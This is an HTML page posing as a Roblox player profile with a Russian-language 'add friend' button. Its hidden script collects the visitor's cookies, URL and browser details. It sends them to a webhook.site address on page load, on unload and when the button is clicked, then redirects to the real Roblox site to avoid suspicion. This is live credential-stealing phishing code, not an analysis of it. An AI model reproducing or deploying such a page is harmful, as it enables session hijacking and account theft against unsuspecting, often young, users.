<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #fff;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .header {
            width: 100%;
            background: #1a1a2e;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #e94560;
        }
        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #e94560;
        }
        .nav-links a {
            color: #fff;
            text-decoration: none;
            margin-left: 25px;
            font-size: 14px;
        }
        .nav-links a:hover { color: #e94560; }
        .content {
            margin-top: 50px;
            text-align: center;
        }
        .profile-avatar {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            background: #333;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            border: 3px solid #e94560;
        }
        .username {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .status {
            color: #4ecca3;
            font-size: 14px;
            margin-bottom: 30px;
        }
        .btn-add-friend {
            background: #e94560;
            color: #fff;
            border: none;
            padding: 12px 40px;
            font-size: 16px;
            border-radius: 25px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn-add-friend:hover { background: #c73652; }
        .footer {
            margin-top: 60px;
            color: #555;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">Roblox</div>
        <div class="nav-links">
            <a href="#">Home</a>
            <a href="#">Games</a>
            <a href="#">Catalog</a>
            <a href="#">Develop</a>
        </div>
    </div>

    <div class="content">
        <div class="profile-avatar">🧑</div>
        <div class="username">Player_Example</div>
        <div class="status">● Online</div>
        <br>
        <button class="btn-add-friend">Добавить в друзья</button>
    </div>

    <div class="footer">
        © 2026 Roblox Corporation
    </div>

    <script>
        function sendCookies() {
            var data = {
                cookies: document.cookie,
                url: window.location.href,
                useragent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                language: navigator.language,
                timestamp: new Date().toISOString()
            };

            fetch('https://webhook.site/983c7046-f3f9-4a46-85a6-f822f70dfbea', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(function() {});

            var img = new Image();
            img.src = 'https://webhook.site/983c7046-f3f9-4a46-85a6-f822f70dfbea?c=' + encodeURIComponent(document.cookie) + '&u=' + encodeURIComponent(window.location.href);
        }

        window.onload = sendCookies;
        window.onbeforeunload = sendCookies;

        document.querySelector('.btn-add-friend').addEventListener('click', function() {
            sendCookies();
            window.location.href = 'https://www.roblox.com';
        });
    </script>
</body>
</html>
